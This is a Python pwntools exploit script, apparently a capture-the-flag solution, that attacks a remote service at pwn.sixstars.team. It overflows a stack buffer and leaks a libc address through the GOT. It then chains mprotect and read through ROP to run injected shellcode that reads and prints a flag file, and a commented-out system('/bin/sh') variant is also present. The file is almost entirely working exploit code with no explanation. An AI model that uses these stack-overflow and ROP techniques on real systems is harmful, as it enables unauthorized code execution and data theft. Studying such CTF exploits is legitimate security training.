#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Copyright © 2018 vam <jpwan21@gmail.com>


from pwn import *
context.log_level="debug"


#libc = ELF("./libc-2.23.so")
#libc = ELF("./libc6-i386_2.23-0ubuntu3_amd64.so")
libc = ELF("./libc6-i386_2.23-0ubuntu10_amd64.so")
bss_chunck = 0x804a000

ret_addr = 0x80485AF
puts_addr_got =0x804A014
write_addr = 0x8048410
payload = 'a'*0x2c + p32(write_addr) + p32(ret_addr) +p32(puts_addr_got)

r=remote("pwn.sixstars.team",23008)
r.recvuntil("Let's end the road of stackoverflow:")
r.sendline(payload)

w=r.recv()[:4]
puts_addr = u32(w)

print hex(puts_addr)
print hex(libc.sym['puts'])
'''
with open('libcfile.txt', 'w') as f:
   for x in libc.sym.keys():
      f.write(x+' ')
      f.write(hex(libc.sym[x])+'\n')
   f.close()
print hex(libc.sym["__libc_start_main"])
'''
libc.address = (puts_addr - libc.sym['printf'])#+0x1000

print hex(libc.address)

system = libc.sym['system']
binsh = list(libc.search("/bin/sh"))[0]
mprotect = libc.sym['mprotect']
read = libc.sym['read']
print hex(system)
print hex(binsh)
print hex(mprotect)


pop_pop_pop_ret = 0x080486A9
payload2 = 'a'*0x2c +p32(mprotect) + p32(pop_pop_pop_ret) + p32(0x804a000) +p32(0x1000)+p32(7)
payload2+= p32(read) + p32(0x804a000) + p32(0) + p32(0x804a000) + p32(0x100)
shellcode = """
  call here
  .ascii "/home/pwn/flag"
  .byte 0
here:
   pop ebx
   mov eax, 5
   mov ecx, 0
   mov edx, 4
   int 0x80
   mov ebx, 3
   mov ecx, 0x804a500
   mov edx, 0x100
   mov eax, 0x03
   int 0x80
   mov ebx, 1
   mov ecx, 0x804a500
   mov edx, 0x100
   mov eax, 0x04
   int 0x80
"""

code = asm(shellcode)
#payload2 = 'a'*0x2c + p32(system) + p32(0) + p32(binsh)
r.sendline(payload2)
r.sendline(code)


'''
r.recvuntil("Let's end the road of stackoverflow:")
www = r.recv()
i=0
while i<0x28:
    w1 = u32(www[i:i+4])
    add1 = w1-libc.address
    print hex(i),
    print hex(w1),
    print hex(add1)
    i+=4
'''
r.interactive()

